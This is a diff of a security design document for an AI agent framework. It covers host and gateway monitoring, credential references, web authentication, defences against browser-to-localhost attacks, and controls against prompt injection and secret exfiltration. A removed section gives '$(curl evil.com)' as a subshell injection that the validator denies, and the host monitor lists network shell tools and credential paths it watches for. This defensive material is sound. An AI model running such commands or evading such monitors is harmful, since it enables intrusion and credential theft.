 | Event | Severity | Description |
 |-------|----------|-------------|
@@ -806,6 +537,139 @@ Available via `GET /api/audit/verify` endpoint.
 | `anomaly_detected` | warn/critical | Sentinel detected anomaly |
 | `agent_error` | warn | Agent execution error |
 | `agent_stalled` | warn | Agent stall detected |
+
+### Host Workstation Monitoring
+
+A practical host-monitoring layer intended for direct host installs where there is no Docker or VM boundary. Windows-first in threat model and process naming, with portable coverage for Linux and macOS.
+
+**Signals:**
+- **Suspicious process detection** — Windows: `wscript.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `bitsadmin.exe`, `certutil.exe`; portable: `osascript`, `launchctl`, `socat`, `nc`
+- **Persistence drift** — Windows Run/RunOnce keys, scheduled tasks, Startup folders; Linux autostart, systemd, crontab; macOS LaunchAgents/Daemons
+- **Sensitive path drift** — GuardianAgent state, SSH, cloud credentials, kube config, shell/PowerShell profiles
+- **Network drift** — new external destinations, new listening ports (high-risk ports elevated)
+- **Firewall posture** — Windows Defender Firewall, Linux ufw/nftables/iptables, macOS pf
+
+**Self-policing behavior:**
+- Critical host alerts can block risky follow-up actions (command execution, outbound/network actions)
+- Multiple active high-severity alerts can force operator review before sensitive execution continues
+- Denials are logged as `action_denied` with `controller: HostMonitor`
+
+**Operator surfaces:** audit events (`host_alert`), configurable notification fanout, Security page (posture cards, active alerts, manual check, acknowledgement), built-in automation starters.
+
+**Limits:** This is a practical first-pass monitor, not EDR-grade telemetry. File drift is metadata-based. Deep process correlation and auditd/eBPF/EndpointSecurity telemetry are future work.
+
+### Gateway Firewall Monitoring
+
+Monitors edge devices (OPNsense, pfSense, UniFi-class gateways) as a separate subsystem from host monitoring.
+
+- Configuration path: `assistant.gatewayMonitoring`
+- Collector mode: operator-configured command returning normalized JSON
+- Baselines: firewall state, WAN default action, rule count, port forwards, admin users, firmware version
+- Detects: firewall disablement/relaxation, configuration drift, port-forward changes, admin-user changes
+- Critical gateway alerts can block sensitive follow-up actions
+- Alert family: `gateway_alert`
+
+Gateway monitoring is intentionally separate from local host monitoring — host monitoring observes the machine GuardianAgent runs on, while gateway monitoring observes remote perimeter devices through operator-supplied collectors.
+
+---
+
+## Credential Handling
+
+- Runtime credential references via `assistant.credentials.refs` — env-backed `credentialRef` is the preferred pattern over inline `apiKey` fields
+- Approval records store redacted arguments and a deterministic hash (`argsHash`) rather than raw sensitive values
+- Credential values are resolved inside the main runtime process when creating provider/tool clients
+- Output scanning and denied-path controls reduce accidental exfiltration
+- Provider-managed secure storage (e.g., OS keyring) is preferred for external integrations
+
+Example:
+
+```yaml
+assistant:
+  credentials:
+    refs:
+      llm.openai.primary:
+        source: env
+        env: OPENAI_API_KEY
+      search.brave.primary:
+        source: env
+        env: BRAVE_API_KEY
+
+llm:
+  openai:
+    provider: openai
+    model: gpt-4o
+    credentialRef: llm.openai.primary
+```
+
+**Limit:** This is a credential reference and resolution layer, not yet a separate secret-broker process. Credentials are better isolated at config level, but not yet held outside the runtime boundary at execution time.
+
+---
+
+## Web Channel Security
+
+| Feature | Implementation |
+|---------|---------------|
+| **Authentication** | Bearer token (required by default) |
+| **Token rotation** | Optional auto-rotation on startup |
+| **CORS** | Configurable allowed origins |
+| **Request limits** | Configurable max body size (default 1MB) |
+| **Auth modes** | `bearer_required` (only supported mode; other values forced to `bearer_required`) |
+| **SSE** | Authenticated via session cookie or `Authorization` header (`?token=` is rejected) |
+
+### Browser-to-Localhost Mitigations
+
+GuardianAgent is hardened against the class of attacks where a malicious website attempts to drive a locally running agent over loopback HTTP/WebSocket interfaces.
+
+- No WebSocket control plane — authenticated HTTP APIs plus authenticated SSE only
+- Localhost/loopback is **not** treated as trusted for API access; `/api/*` and `/sse` always require authentication
+- When no web token is configured, a secure random token is generated for the active run
+- Wildcard CORS (`'*'`) is rejected by configuration validation
+- Browser session cookies are `HttpOnly` and `SameSite=Strict`
+- Repeated authentication failures are rate-limited and temporarily blocked
+- Privileged state-changing operations require short-lived privileged tickets in addition to base authentication
+- SSE does not accept query-string tokens
+
+**Residual risk:** Broad `allowedOrigins` settings weaken the browser boundary. Binding to non-loopback interfaces increases remote attack surface. Valid bearer tokens still grant full API access within the authorization model.
+
+---
+
+## Integration Security
+
+### Native Skills
+
+Skills are a **knowledge and workflow layer**, not a privileged execution layer.
+
+- Loaded from configured local roots by default
+- Skills do not create or bypass tools, and do not grant capabilities
+- Skills may recommend actions, but execution goes through ToolExecutor and Guardian
+- Any future install/setup steps must be explicitly approval-gated
+
+### Google Workspace
+
+Integration with Gmail, Calendar, Drive, Docs, and Sheets via managed MCP server (`@googleworkspace/cli`).
+
+- The GWS CLI is **not bundled** — installed separately by the user
+- OAuth 2.0 requires an interactive browser flow (`gws auth login`) — cannot be initiated headlessly
+- Credentials stored in the OS keyring by `gws`, not by GuardianAgent
+- Only configured Google services are exposed (opt-in via `services` array)
+- External send/post actions (e.g. `gmail_send`) remain approval-gated
+- Email addresses exempted only in addressing fields for email/calendar tools (see PII Exemptions above)
+
+### MCP Tool Servers
+
+- Tool names namespaced (`mcp-<serverId>-<toolName>`) to prevent collisions
+- All MCP tool calls pass through Guardian admission
+- Risk inferred from MCP metadata (`read_only`, `mutating`, `external_post`)
+- Optional per-server `trustLevel` and `maxCallsPerMinute` overrides
+
+### Orchestration Security
+
+Multi-agent orchestration (Sequential, Parallel, Loop, Conditional agents) maintains security invariants:
+
+- All sub-agent invocations go through `Runtime.dispatchMessage()`
+- Each sub-agent call passes through the full Guardian admission pipeline
+- Shared state between agents is scoped and cleaned between runs
+- Orchestration agents receive `ctx.dispatch()` — a guarded wrapper, not raw runtime access
 
 ---
 
@@ -835,43 +699,6 @@ Available via `GET /api/audit/verify` endpoint.
 
 ---
 
-## Shell Command Validation
-
-The ShellCommandController goes beyond simple string matching:
-
-1. **POSIX tokenizer** handles quoting (`echo "hello && world"` → one command)
-2. **Chain splitting** on `&&`, `||`, `;`, `|` operators
-3. **Each sub-command** validated against whitelist
-4. **Redirect targets** (`> .env`) checked against denied paths
-5. **Subshell detection** (`$(curl evil.com)`) → denied
-6. **Deny by default** if parser can't fully understand the input
-
----
-
-## Web Channel Security
-
-| Feature | Implementation |
-|---------|---------------|
-| **Authentication** | Bearer token (required by default) |
-| **Token rotation** | Optional auto-rotation on startup |
-| **CORS** | Configurable allowed origins |
-| **Request limits** | Configurable max body size (default 1MB) |
-| **Auth modes** | `bearer_required` (only supported mode; other values are ignored and forced to `bearer_required`) |
-| **SSE** | Real-time stream authenticated via session cookie or `Authorization` header (`?token=` is rejected) |
-
----
-
-## Orchestration Security
-
-Multi-agent orchestration (Sequential, Parallel, Loop, Conditional agents) maintains security invariants:
-
-- All sub-agent invocations go through `Runtime.dispatchMessage()`
-- Each sub-agent call passes through the full Guardian admission pipeline
-- Shared state between agents is scoped and cleaned between runs
-- Orchestration agents receive `ctx.dispatch()` — a guarded wrapper, not raw runtime access
-
----
-
 ## Design Principles
 
 ### Meta's Rule of Two
@@ -891,9 +718,23 @@ An agent should satisfy **at most two** of:
 | Audit logging | **Automatic** for all security events | Manual instrumentation |
 | Context isolation | **Brokered worker + frozen context** on framework surfaces | Documentation only |
 
+### Core Hardening Summary
+
+- Mandatory runtime chokepoints: every message, LLM call, response, and event is mediated by Runtime enforcement
+- Least-privilege capability model with immutable frozen context
+- Prompt-injection resistance: invisible Unicode stripping plus weighted injection signal scoring
+- Tool governance and sandboxing: approval workflows, per-tool policy overrides, risk-tiered classes
+- Connector + playbook guardrails: host/path/command/capability allowlists, bounded step execution, signed/dry-run controls
+- Secret exfiltration controls: multi-pattern scanning, response redaction/blocking, inter-agent payload blocking
+- Intent hardening via SOUL profile: configurable injection with primary/delegated modes
+- Cryptographic correlation: deterministic SHA-256 hashes of redacted tool args for traceability
+- Web auth hardening: constant-time bearer comparison plus short-lived signed privileged tickets
+- Tamper-evident policy-change trail: SHA-256 config snapshots recorded as `policy_changed` audit events
+- SQLite integrity hardening: periodic `PRAGMA quick_check`, secure permissions, and hashed integrity checkpoints
+
 ---
 
-## Configuration
+## Configuration Reference
 
 All security features are configurable in `~/.guardianagent/config.yaml`:
 
@@ -937,24 +778,6 @@ guardian:
 
 ---
 
-## Security Verification Artifacts
-
-Current verification artifacts for the claims in this document live in:
-
-- `docs/security-testing-results/README.md`
-- `docs/security-testing-results/SECURITY-CLAIM-MATRIX.md`
-- `docs/security-testing-results/SECURITY-TEST-RESULTS-2026-03-12.md`
-- `docs/security-testing-results/RELATED-TEST-SCRIPTS.md`
-
-Primary executable harnesses:
-
-- `scripts/test-security-verification.mjs`
-- `scripts/test-brokered-isolation.mjs`
-- `scripts/test-web-approvals.mjs`
-- `scripts/test-cli-approvals.mjs`
-
----
-
 ## Extensibility
 
 ### Custom Admission Controllers
@@ -988,3 +811,21 @@ guardian:
     - '\\.secrets$'
     - 'internal/keys/'
 ```
+
+---
+
+## Security Verification Artifacts
+
+Current verification artifacts for the claims in this document:
+
+- `docs/security-testing-results/README.md`
+- `docs/security-testing-results/SECURITY-CLAIM-MATRIX.md`
+- `docs/security-testing-results/SECURITY-TEST-RESULTS-2026-03-12.md`
+- `docs/security-testing-results/RELATED-TEST-SCRIPTS.md`
+
+Primary executable harnesses:
+
+- `scripts/test-security-verification.mjs`
+- `scripts/test-brokered-isolation.mjs`
+- `scripts/test-web-approvals.mjs`
+- `scripts/test-cli-approvals.mjs`
